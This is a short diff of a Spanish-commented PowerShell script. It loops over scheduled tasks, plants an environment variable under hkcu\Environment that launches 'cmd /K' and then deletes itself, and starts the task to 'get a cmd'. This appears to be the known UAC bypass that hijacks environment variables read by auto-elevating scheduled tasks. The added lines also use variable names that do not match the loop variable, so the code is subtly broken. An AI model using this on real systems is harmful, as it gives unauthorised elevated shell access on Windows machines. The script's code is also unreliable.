@@ -50,8 +50,10 @@ foreach ($tarea in $tareas) {
 # Imprimir las tareas que cumplen con los criterios
 foreach ($tarea in $tareasCumplen) {
     $nombreTarea = $tarea[0]  # Accediendo al primer elemento de la tupla
-    
     # Bypass
     reg add hkcu\Environment /v $nombreTare /d "cmd /K reg delete hkcu\Environment /v $nombreTare /f && REM "
-    Get-ScheduledTask $nombreTarea
+    # Recargar las variables de entorno en la propia terminal
+    refreshenv
+    # Obtener un cmd
+    Start-ScheduledTask -TaskName $nombre_de_la_tarea
 }
